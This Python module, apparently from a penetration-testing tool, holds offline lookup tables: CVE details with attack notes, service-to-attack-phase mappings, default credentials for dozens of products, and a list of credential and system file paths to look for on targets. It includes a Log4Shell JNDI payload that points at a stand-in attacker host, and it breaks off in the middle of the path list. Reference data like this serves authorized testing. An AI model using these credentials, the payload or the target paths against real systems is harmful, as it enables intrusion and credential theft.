"""BuiltInKnowledge — Offline security intelligence for ForgeBrain.

Provides authoritative lookup tables that do not require an LLM or network call:
    - CVE_TECHNIQUE_MAP       : CVE-ID → {title, technique, mitre, cvss3, cvss4, epss, kev}
    - SERVICE_ATTACK_PHASES   : service name → [attack phases where it's relevant]
    - DEFAULT_CREDENTIALS     : service/product → [(user, pass), ...]
    - SENSITIVE_FILE_PATHS    : list of paths worth checking on target servers
    - CLOUD_IMDSv1_PATHS      : cloud metadata service endpoints
    - MITRE_TECHNIQUE_NAMES   : T-ID → technique name (subset)

All data reflects publicly known vulnerability information.
FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

from typing import Any


# ══════════════════════════════════════════════════════════════════════
# CVE → TECHNIQUE MAP
# Format: {cve_id: {title, technique, mitre, cvss3_score, cvss3_vector,
#                   cvss4_score, cvss4_vector, epss, kev, notes}}
# ══════════════════════════════════════════════════════════════════════

CVE_TECHNIQUE_MAP: dict[str, dict[str, Any]] = {
    # ── SQL Injection ─────────────────────────────────────────────────
    "CVE-2023-23752": {
        "title":       "Joomla! Unauthorized REST API Access (SQLi possible)",
        "technique":   "SQL Injection / Unauthorized API Access",
        "mitre":       "T1190",
        "cvss3_score": 7.5,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "cvss4_score": 8.7,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
        "epss":        0.9412,
        "kev":         True,
        "notes":       "Unauthenticated access to Joomla! /api/index.php endpoints; "
                       "leaks credentials and config.",
    },
    "CVE-2021-44228": {
        "title":       "Log4Shell — Apache Log4j2 JNDI RCE",
        "technique":   "Remote Code Execution via Log Injection",
        "mitre":       "T1190",
        "cvss3_score": 10.0,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "cvss4_score": 10.0,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
        "epss":        0.9766,
        "kev":         True,
        "notes":       "JNDI lookup in log messages. Affects Log4j 2.0-2.14.1. "
                       "Payload: ${jndi:ldap://attacker.com/a}",
    },
    "CVE-2022-22965": {
        "title":       "Spring4Shell — Spring Framework RCE",
        "technique":   "Remote Code Execution via Class Loader Manipulation",
        "mitre":       "T1190",
        "cvss3_score": 9.8,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cvss4_score": 9.3,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
        "epss":        0.9751,
        "kev":         True,
        "notes":       "Spring MVC/WebFlux on JDK >= 9. Requires multipart request; "
                       "class.module.classLoader data binding.",
    },
    "CVE-2019-0708": {
        "title":       "BlueKeep — Windows RDP Pre-Auth RCE",
        "technique":   "Exploit Public-Facing Application / Lateral Movement",
        "mitre":       "T1210",
        "cvss3_score": 9.8,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cvss4_score": 9.3,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
        "epss":        0.9741,
        "kev":         True,
        "notes":       "Use-after-free in RDP; wormable. Affects Win7/2008R2/XP/2003. "
                       "CVE-2019-1181/1182 are follow-ons.",
    },
    "CVE-2017-0144": {
        "title":       "EternalBlue — SMBv1 RCE (MS17-010)",
        "technique":   "Exploit SMB Protocol Vulnerability",
        "mitre":       "T1210",
        "cvss3_score": 8.1,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cvss4_score": 8.9,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
        "epss":        0.9757,
        "kev":         True,
        "notes":       "Used by WannaCry and NotPetya ransomware. Affects SMBv1. "
                       "Patched in MS17-010.",
    },
    "CVE-2021-34527": {
        "title":       "PrintNightmare — Windows Print Spooler RCE/LPE",
        "technique":   "Privilege Escalation / Remote Code Execution",
        "mitre":       "T1068",
        "cvss3_score": 8.8,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
        "cvss4_score": 8.6,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
        "epss":        0.9719,
        "kev":         True,
        "notes":       "AddPrinterDriver / RpcAddPrinterDriverEx. Works locally (LPE) "
                       "and remotely (RCE). Patch: KB5004945.",
    },
    "CVE-2020-1472": {
        "title":       "Zerologon — Netlogon Privilege Escalation",
        "technique":   "Privilege Escalation / Domain Compromise",
        "mitre":       "T1210",
        "cvss3_score": 10.0,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "cvss4_score": 10.0,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
        "epss":        0.9766,
        "kev":         True,
        "notes":       "CVE-2020-1472. AES-CFB8 IV=0 flaw. Resets DC machine account. "
                       "Patch: August 2020 rollup + Enforcement mode Feb 2021.",
    },
    "CVE-2021-26855": {
        "title":       "ProxyLogon — Exchange Server SSRF + RCE",
        "technique":   "Server-Side Request Forgery / Arbitrary File Write",
        "mitre":       "T1190",
        "cvss3_score": 9.8,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cvss4_score": 9.3,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
        "epss":        0.9771,
        "kev":         True,
        "notes":       "SSRF in OWA pre-auth. Chained with CVE-2021-27065 for webshell "
                       "write. Affects Exchange 2013-2019.",
    },
    "CVE-2023-4966": {
        "title":       "Citrix Bleed — NetScaler Session Token Leak",
        "technique":   "Credential Theft / Session Hijacking",
        "mitre":       "T1539",
        "cvss3_score": 9.4,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "cvss4_score": 9.2,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
        "epss":        0.9764,
        "kev":         True,
        "notes":       "Buffer over-read in Citrix NetScaler. Leaks session tokens "
                       "bypassing MFA. Affects < 13.1-49.13.",
    },
    "CVE-2024-3400": {
        "title":       "PAN-OS GlobalProtect OS Command Injection",
        "technique":   "OS Command Injection / Pre-Auth RCE",
        "mitre":       "T1190",
        "cvss3_score": 10.0,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "cvss4_score": 10.0,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
        "epss":        0.9732,
        "kev":         True,
        "notes":       "SESSID cookie injection in GlobalProtect gateway. "
                       "Exploited by UTA0218 before patch release.",
    },
    "CVE-2023-46604": {
        "title":       "Apache ActiveMQ RCE (ClassInfo Deserialization)",
        "technique":   "Deserialization / Remote Code Execution",
        "mitre":       "T1190",
        "cvss3_score": 10.0,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "cvss4_score": 10.0,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
        "epss":        0.9778,
        "kev":         True,
        "notes":       "OpenWire protocol ClassInfo deserialization. Port 61616. "
                       "Used by HelloKitty ransomware gang.",
    },
    "CVE-2022-0847": {
        "title":       "Dirty Pipe — Linux Kernel Pipe Privilege Escalation",
        "technique":   "Local Privilege Escalation",
        "mitre":       "T1068",
        "cvss3_score": 7.8,
        "cvss3_vector":"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
        "cvss4_score": 8.5,
        "cvss4_vector":"CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
        "epss":        0.0004,
        "kev":         False,
        "notes":       "Arbitrary write to read-only page via pipe splice. "
                       "Affects kernel 5.8–5.16.11. Can overwrite /etc/passwd.",
    },
    "CVE-2021-3156": {
        "title":       "Baron Samedit — sudo Heap Buffer Overflow LPE",
        "technique":   "Local Privilege Escalation",
        "mitre":       "T1068",
        "cvss3_score": 7.8,
        "cvss3_vector":"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
        "cvss4_score": 8.5,
        "cvss4_vector":"CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
        "epss":        0.9732,
        "kev":         True,
        "notes":       "sudoedit -s argument heap overflow. Any local user to root. "
                       "Affects sudo < 1.9.5p2.",
    },
    "CVE-2023-22515": {
        "title":       "Confluence Server Broken Access Control (Admin Account)",
        "technique":   "Account Creation / Privilege Escalation",
        "mitre":       "T1136",
        "cvss3_score": 10.0,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "cvss4_score": 10.0,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
        "epss":        0.9751,
        "kev":         True,
        "notes":       "Unauthenticated admin account creation via /setup/setupadminaccount.action. "
                       "Exploited in the wild by Storm-0062.",
    },
    "CVE-2024-21762": {
        "title":       "Fortinet FortiOS Out-of-Bound Write RCE",
        "technique":   "Pre-Auth Remote Code Execution",
        "mitre":       "T1190",
        "cvss3_score": 9.8,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cvss4_score": 9.3,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
        "epss":        0.9741,
        "kev":         True,
        "notes":       "Out-of-bounds write in SSL-VPN web management. "
                       "Affects FortiOS 6.0–7.4.2. Workaround: disable HTTPS admin.",
    },
    "CVE-2023-27997": {
        "title":       "Fortinet FortiGate SSL-VPN Heap Overflow Pre-Auth RCE",
        "technique":   "Pre-Auth Heap Buffer Overflow RCE",
        "mitre":       "T1190",
        "cvss3_score": 9.8,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cvss4_score": 9.3,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
        "epss":        0.9760,
        "kev":         True,
        "notes":       "Heap overflow in FortiGate SSL-VPN web frontend. "
                       "Requires SSL-VPN enabled. Xortigate PoC public.",
    },
    "CVE-2022-47966": {
        "title":       "ManageEngine Unauthenticated RCE via SAML",
        "technique":   "SAML Authentication Bypass / RCE",
        "mitre":       "T1190",
        "cvss3_score": 9.8,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cvss4_score": 9.3,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
        "epss":        0.9757,
        "kev":         True,
        "notes":       "Affects 24+ ManageEngine products using outdated Apache Santuario. "
                       "Exploits xmlsec1 SAML signature bypass.",
    },
    "CVE-2023-34048": {
        "title":       "VMware vCenter Server DCERPC Out-of-Bounds Write RCE",
        "technique":   "Pre-Auth Remote Code Execution",
        "mitre":       "T1210",
        "cvss3_score": 9.8,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cvss4_score": 9.3,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
        "epss":        0.9712,
        "kev":         True,
        "notes":       "DCERPC protocol heap write in vCenter Server. "
                       "Exploited as zero-day in the wild by Chinese APT.",
    },
    "CVE-2024-1709": {
        "title":       "ConnectWise ScreenConnect Authentication Bypass",
        "technique":   "Authentication Bypass / Setup Wizard Re-enable",
        "mitre":       "T1190",
        "cvss3_score": 10.0,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "cvss4_score": 10.0,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
        "epss":        0.9764,
        "kev":         True,
        "notes":       "Setup wizard accessible without auth (path traversal). "
                       "Allows admin account creation. Massively exploited within 24h.",
    },
    "CVE-2023-35078": {
        "title":       "Ivanti EPMM (MobileIron) Unauthenticated API Access",
        "technique":   "Unauthenticated Remote Access / PII Exposure",
        "mitre":       "T1190",
        "cvss3_score": 10.0,
        "cvss3_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "cvss4_score": 10.0,
        "cvss4_vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
        "epss":        0.9757,
        "kev":         True,
        "notes":       "Path traversal bypasses auth on /mifs/asfV3/api/v2/. "
                       "Used against Norwegian government targets.",
    },
}


# ══════════════════════════════════════════════════════════════════════
# SERVICE → ATTACK PHASES
# Format: {service_name_lower: [phases]}
# Phases: recon, initial_access, execution, persistence,
#         privilege_escalation, defense_evasion, credential_access,
#         discovery, lateral_movement, collection, exfiltration, impact
# ══════════════════════════════════════════════════════════════════════

SERVICE_ATTACK_PHASES: dict[str, list[str]] = {
    # ── Network Infrastructure ────────────────────────────────────────
    "ftp":           ["recon", "initial_access", "credential_access", "exfiltration"],
    "ssh":           ["initial_access", "execution", "persistence", "lateral_movement"],
    "telnet":        ["initial_access", "credential_access", "lateral_movement"],
    "smtp":          ["recon", "initial_access", "collection", "exfiltration"],
    "dns":           ["recon", "exfiltration", "defense_evasion", "lateral_movement"],
    "http":          ["recon", "initial_access", "execution", "exfiltration"],
    "https":         ["recon", "initial_access", "execution", "exfiltration"],
    "smb":           ["lateral_movement", "credential_access", "collection", "execution"],
    "rdp":           ["initial_access", "lateral_movement", "execution", "persistence"],
    "vnc":           ["initial_access", "lateral_movement", "execution"],
    "snmp":          ["recon", "discovery", "credential_access"],
    "nfs":           ["recon", "collection", "lateral_movement"],
    "ldap":          ["recon", "discovery", "credential_access", "lateral_movement"],
    "ldaps":         ["recon", "discovery", "credential_access", "lateral_movement"],
    "kerberos":      ["credential_access", "lateral_movement", "privilege_escalation"],
    "netbios":       ["recon", "discovery", "lateral_movement"],
    "msrpc":         ["lateral_movement", "execution", "privilege_escalation"],
    "winrm":         ["lateral_movement", "execution", "persistence"],
    "wmi":           ["execution", "persistence", "lateral_movement", "defense_evasion"],
    "pop3":          ["credential_access", "collection"],
    "imap":          ["credential_access", "collection"],
    "pop3s":         ["credential_access", "collection"],
    "imaps":         ["credential_access", "collection"],
    # ── Databases ─────────────────────────────────────────────────────
    "mysql":         ["recon", "credential_access", "collection", "exfiltration"],
    "mssql":         ["recon", "credential_access", "execution", "exfiltration", "lateral_movement"],
    "postgresql":    ["recon", "credential_access", "collection", "exfiltration"],
    "oracle":        ["recon", "credential_access", "collection", "exfiltration"],
    "mongodb":       ["recon", "credential_access", "collection", "exfiltration"],
    "redis":         ["recon", "credential_access", "execution", "persistence", "lateral_movement"],
    "memcached":     ["recon", "credential_access", "collection"],
    "cassandra":     ["recon", "credential_access", "collection"],
    "elasticsearch": ["recon", "collection", "exfiltration", "discovery"],
    "couchdb":       ["recon", "credential_access", "collection"],
    "neo4j":         ["recon", "credential_access", "collection"],
    "influxdb":      ["recon", "credential_access", "collection"],
    # ── Middleware / Message Brokers ──────────────────────────────────
    "activemq":      ["initial_access", "execution", "lateral_movement"],
    "rabbitmq":      ["recon", "credential_access", "lateral_movement"],
    "kafka":         ["recon", "collection", "exfiltration"],
    "zookeeper":     ["recon", "discovery", "execution"],
    "jmx":           ["recon", "credential_access", "execution", "privilege_escalation"],
    "jndi":          ["initial_access", "execution", "privilege_escalation"],
    "tomcat":        ["initial_access", "execution", "persistence"],
    "jboss":         ["initial_access", "execution", "persistence"],
    "weblogic":      ["initial_access", "execution", "persistence", "privilege_escalation"],
    "websphere":     ["initial_access", "execution", "persistence"],
    # ── Cloud / Serverless ────────────────────────────────────────────
    "imds":          ["credential_access", "discovery", "privilege_escalation", "lateral_movement"],
    "s3":            ["recon", "collection", "exfiltration", "initial_access"],
    "iam":           ["privilege_escalation", "persistence", "lateral_movement"],
    "ecr":           ["collection", "persistence", "lateral_movement"],
    "lambda":        ["execution", "persistence", "privilege_escalation"],
    "ecs":           ["execution", "lateral_movement", "persistence"],
    "kubernetes":    ["initial_access", "execution", "privilege_escalation", "lateral_movement", "persistence"],
    "docker":        ["initial_access", "execution", "privilege_escalation", "persistence"],
    "etcd":          ["credential_access", "collection", "privilege_escalation"],
    # ── Security / VPN Infrastructure ────────────────────────────────
    "vpn":           ["initial_access", "lateral_movement"],
    "fortivpn":      ["initial_access", "credential_access", "persistence"],
    "pulsesecure":   ["initial_access", "credential_access", "persistence"],
    "citrixadc":     ["initial_access", "credential_access", "execution"],
    "globalprotect": ["initial_access", "credential_access", "execution"],
    "openvpn":       ["initial_access", "lateral_movement"],
    "ipsec":         ["recon", "initial_access", "lateral_movement"],
    # ── DevOps / CI/CD ────────────────────────────────────────────────
    "jenkins":       ["initial_access", "execution", "privilege_escalation", "persistence", "lateral_movement"],
    "gitlab":        ["recon", "initial_access", "credential_access", "persistence"],
    "github_actions":["initial_access", "execution", "persistence", "exfiltration"],
    "sonarqube":     ["recon", "credential_access", "collection"],
    "nexus":         ["recon", "credential_access", "initial_access"],
    "artifactory":   ["recon", "credential_access", "initial_access"],
    "terraform":     ["initial_access", "execution", "privilege_escalation"],
    "ansible":       ["execution", "lateral_movement", "privilege_escalation"],
    "kubernetes_api":["initial_access", "execution", "privilege_escalation", "lateral_movement"],
    # ── Monitoring / Management ───────────────────────────────────────
    "grafana":       ["recon", "credential_access", "collection"],
    "kibana":        ["recon", "credential_access", "collection"],
    "prometheus":    ["recon", "discovery", "collection"],
    "nagios":        ["recon", "credential_access", "execution"],
    "zabbix":        ["recon", "credential_access", "execution"],
    "splunk":        ["recon", "credential_access", "collection"],
    "netdata":       ["recon", "discovery"],
    "portainer":     ["credential_access", "execution", "privilege_escalation"],
    "phpmyadmin":    ["recon", "credential_access", "execution", "collection"],
    "adminer":       ["credential_access", "execution", "collection"],
    # ── Active Directory / Identity ───────────────────────────────────
    "ad_dc":         ["recon", "credential_access", "lateral_movement", "privilege_escalation"],
    "adcs":          ["credential_access", "privilege_escalation", "persistence", "lateral_movement"],
    "adfs":          ["credential_access", "initial_access", "privilege_escalation"],
    "entra_id":      ["credential_access", "initial_access", "privilege_escalation", "persistence"],
    "laps":          ["credential_access", "lateral_movement"],
    "gpo":           ["execution", "persistence", "privilege_escalation"],
    "ntlm":          ["credential_access", "lateral_movement"],
    "krbtgt":        ["credential_access", "lateral_movement", "privilege_escalation"],
    # ── Web App Platforms ─────────────────────────────────────────────
    "wordpress":     ["initial_access", "execution", "persistence", "privilege_escalation"],
    "drupal":        ["initial_access", "execution", "persistence"],
    "joomla":        ["initial_access", "execution", "credential_access", "persistence"],
    "magento":       ["initial_access", "credential_access", "collection"],
    "confluence":    ["initial_access", "execution", "credential_access", "persistence"],
    "jira":          ["recon", "credential_access", "collection", "initial_access"],
    "sharepoint":    ["initial_access", "credential_access", "collection", "lateral_movement"],
    "exchange":      ["initial_access", "credential_access", "collection", "persistence"],
}


# ══════════════════════════════════════════════════════════════════════
# DEFAULT CREDENTIALS
# Format: {service: [(username, password), ...]}
# Ordered: most commonly observed first
# ══════════════════════════════════════════════════════════════════════

DEFAULT_CREDENTIALS: dict[str, list[tuple[str, str]]] = {
    "tomcat": [
        ("tomcat",  "tomcat"),
        ("admin",   "admin"),
        ("admin",   "password"),
        ("admin",   "s3cret"),
        ("manager", "manager"),
        ("tomcat",  "s3cret"),
        ("both",    "tomcat"),
        ("role1",   "tomcat"),
        ("root",    "root"),
    ],
    "jenkins": [
        ("admin",   "admin"),
        ("jenkins", "jenkins"),
        ("admin",   "password"),
        ("admin",   "jenkins"),
        ("root",    "root"),
    ],
    "phpmyadmin": [
        ("root",    ""),
        ("root",    "root"),
        ("root",    "toor"),
        ("admin",   "admin"),
        ("admin",   "password"),
        ("pma",     "pma"),
        ("mysql",   "mysql"),
    ],
    "mysql": [
        ("root",    ""),
        ("root",    "root"),
        ("root",    "mysql"),
        ("mysql",   "mysql"),
        ("admin",   "admin"),
        ("dbadmin", "dbadmin"),
    ],
    "mssql": [
        ("sa",      ""),
        ("sa",      "sa"),
        ("sa",      "password"),
        ("sa",      "Password1"),
        ("sa",      "admin"),
        ("admin",   "admin"),
    ],
    "postgresql": [
        ("postgres", "postgres"),
        ("postgres", ""),
        ("postgres", "admin"),
        ("admin",    "admin"),
        ("dbadmin",  "dbadmin"),
        ("root",     "root"),
    ],
    "mongodb": [
        ("admin",   "admin"),
        ("root",    "root"),
        ("",        ""),          # No auth (common misconfiguration)
        ("admin",   "password"),
        ("mongoadmin", "mongoadmin"),
    ],
    "redis": [
        ("",        ""),          # Default: no password required
        ("default", ""),
        ("admin",   "admin"),
        ("redis",   "redis"),
        ("root",    "root"),
    ],
    "elasticsearch": [
        ("elastic", "changeme"),
        ("elastic", "elastic"),
        ("admin",   "admin"),
        ("",        ""),          # Pre-6.8: no auth
    ],
    "rabbitmq": [
        ("guest",   "guest"),
        ("admin",   "admin"),
        ("rabbitmq","rabbitmq"),
        ("admin",   "password"),
    ],
    "activemq": [
        ("admin",   "admin"),
        ("system",  "manager"),
        ("user",    "user"),
        ("guest",   "guest"),
    ],
    "zabbix": [
        ("Admin",   "zabbix"),
        ("admin",   "admin"),
        ("admin",   "zabbix"),
        ("guest",   ""),
    ],
    "nagios": [
        ("nagiosadmin", "nagiosadmin"),
        ("admin",       "admin"),
        ("nagios",      "nagios"),
    ],
    "grafana": [
        ("admin",   "admin"),
        ("admin",   "password"),
        ("admin",   "grafana"),
        ("root",    "root"),
    ],
    "kibana": [
        ("elastic", "changeme"),
        ("elastic", "elastic"),
        ("admin",   "admin"),
        ("kibana",  "kibana"),
    ],
    "portainer": [
        ("admin",   "admin"),
        ("admin",   "portainer"),
        ("admin",   "password"),
    ],
    "sonarqube": [
        ("admin",   "admin"),
        ("admin",   "sonar"),
        ("sonar",   "sonar"),
    ],
    "nexus": [
        ("admin",   "admin123"),
        ("admin",   "admin"),
        ("deployment", "deployment123"),
    ],
    "artifactory": [
        ("admin",   "password"),
        ("admin",   "admin"),
        ("admin",   "AKCp5"),
    ],
    "jira": [
        ("admin",   "admin"),
        ("admin",   "password"),
        ("jira",    "jira"),
    ],
    "confluence": [
        ("admin",   "admin"),
        ("admin",   "password"),
        ("confluence", "confluence"),
    ],
    "weblogic": [
        ("weblogic", "weblogic1"),
        ("weblogic", "welcome1"),
        ("admin",    "admin123"),
        ("system",   "Passw0rd"),
    ],
    "jboss": [
        ("admin",   "admin"),
        ("admin",   "password"),
        ("jboss",   "jboss"),
    ],
    "wordpress": [
        ("admin",   "admin"),
        ("admin",   "password"),
        ("admin",   "123456"),
        ("wp",      "wp"),
        ("wordpress","wordpress"),
    ],
    "drupal": [
        ("admin",   "admin"),
        ("admin",   "password"),
        ("drupal",  "drupal"),
    ],
    "joomla": [
        ("admin",   "admin"),
        ("admin",   "password"),
        ("admin",   "123456"),
        ("joomla",  "joomla"),
    ],
    "netdata": [
        ("admin",   "admin"),
        ("",        ""),          # Default: no auth
    ],
    "snmp": [
        # Community strings (user = community, pass = "")
        ("public",  ""),
        ("private", ""),
        ("community", ""),
        ("admin",   ""),
        ("cisco",   ""),
        ("public",  "public"),
        ("monitor", ""),
        ("default", ""),
        ("write",   ""),
        ("read",    ""),
    ],
    "cisco_ios": [
        ("admin",   "admin"),
        ("cisco",   "cisco"),
        ("admin",   "cisco"),
        ("admin",   "Admin"),
        ("admin",   "Password"),
        ("cisco",   "password"),
        ("enable",  "enable"),
    ],
    "fortigate": [
        ("admin",   ""),           # Factory default: no password
        ("admin",   "admin"),
        ("admin",   "password"),
    ],
    "paloalto": [
        ("admin",   "admin"),
        ("admin",   "Admin123"),
        ("admin",   "password"),
    ],
    "f5_bigip": [
        ("admin",   "admin"),
        ("root",    "default"),
        ("root",    "root"),
        ("admin",   "f5"),
    ],
    "vmware_vcenter": [
        ("administrator@vsphere.local", "VMware1!"),
        ("administrator@vsphere.local", "Admin@123"),
        ("root",    "vmware"),
        ("root",    "password"),
    ],
    "vmware_esxi": [
        ("root",    "vmware"),
        ("root",    "password"),
        ("root",    ""),
        ("admin",   "admin"),
    ],
    "citrix_netscaler": [
        ("nsroot",  "nsroot"),
        ("admin",   "admin"),
        ("admin",   "password"),
    ],
    "juniper": [
        ("root",    ""),
        ("admin",   "admin"),
        ("netscreen", "netscreen"),
    ],
    "printer_hp": [
        ("admin",   "admin"),
        ("admin",   ""),
        ("admin",   "1234"),
    ],
    "printer_canon": [
        ("root",    ""),
        ("ADMIN",   ""),
        ("admin",   "admin"),
    ],
    "printer_ricoh": [
        ("admin",   ""),
        ("admin",   "password"),
        ("admin",   "Admin"),
    ],
    "camera_hikvision": [
        ("admin",   "12345"),
        ("admin",   "admin"),
        ("admin",   "Admin1234"),
    ],
    "camera_dahua": [
        ("admin",   "admin"),
        ("888888",  "888888"),
        ("666666",  "666666"),
    ],
    "router_netgear": [
        ("admin",   "password"),
        ("admin",   "admin"),
        ("admin",   "1234"),
    ],
    "router_dlink": [
        ("admin",   ""),
        ("admin",   "admin"),
        ("Admin",   ""),
    ],
    "router_tplink": [
        ("admin",   "admin"),
        ("admin",   "password"),
        ("admin",   "tp-link"),
    ],
    "vpn_openvpn_as": [
        ("openvpn", "openvpn"),
        ("admin",   "admin"),
    ],
    "rdp": [
        ("administrator", "administrator"),
        ("administrator", "password"),
        ("administrator", "Admin@123"),
        ("admin",         "admin"),
        ("guest",         ""),
        ("user",          "user"),
    ],
    "ssh": [
        ("root",    "root"),
        ("root",    "toor"),
        ("root",    "password"),
        ("admin",   "admin"),
        ("admin",   "password"),
        ("user",    "user"),
        ("pi",      "raspberry"),   # Raspberry Pi default
        ("ubnt",    "ubnt"),        # Ubiquiti default
        ("ubuntu",  "ubuntu"),
        ("vagrant", "vagrant"),
    ],
    "ftp": [
        ("anonymous", "anonymous"),
        ("anonymous", ""),
        ("ftp",     "ftp"),
        ("admin",   "admin"),
        ("root",    "root"),
    ],
    "influxdb": [
        ("admin",   "admin"),
        ("admin",   "password"),
        ("root",    "root"),
        ("",        ""),
    ],
    "couchdb": [
        ("admin",   "admin"),
        ("admin",   "couchdb"),
        ("admin",   "password"),
        ("",        ""),
    ],
    "memcached": [
        ("",        ""),          # No auth by default
    ],
    "zookeeper": [
        ("",        ""),          # No auth by default
        ("admin",   "admin"),
    ],
    "prometheus": [
        ("admin",   "admin"),
        ("",        ""),          # Often unauthenticated
    ],
}


# ══════════════════════════════════════════════════════════════════════
# SENSITIVE FILE PATHS
# Grouped by category for targeted wordlist generation
# ══════════════════════════════════════════════════════════════════════

SENSITIVE_FILE_PATHS: list[str] = [
    # ── Linux/Unix system files ───────────────────────────────────────
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/gshadow",
    "/etc/sudoers",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/resolv.conf",
    "/etc/crontab",
    "/etc/cron.d/",
    "/var/spool/cron/crontabs/root",
    "/etc/ssh/sshd_config",
    "/etc/ssh/ssh_host_rsa_key",
    "/etc/ssh/ssh_host_ed25519_key",
    "/etc/ssl/private/",
    "/etc/mysql/my.cnf",
    "/etc/postgresql/*/main/pg_hba.conf",
    "/etc/redis/redis.conf",
    "/etc/nginx/nginx.conf",
    "/etc/nginx/sites-available/default",
    "/etc/apache2/apache2.conf",
    "/etc/apache2/sites-available/000-default.conf",
    "/etc/httpd/conf/httpd.conf",
    "/etc/php.ini",
    "/etc/php/*/fpm/php.ini",
    "/etc/environment",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/maps",
    "/proc/self/fd/0",
    "/proc/net/tcp",
    "/proc/version",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_ed25519",
    "/root/.ssh/authorized_keys",
    "/root/.ssh/known_hosts",
    "/home/*/.bash_history",
    "/home/*/.ssh/id_rsa",
    "/home/*/.netrc",
    "/home/*/.aws/credentials",
    "/home/*/.config/gcloud/credentials.db",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
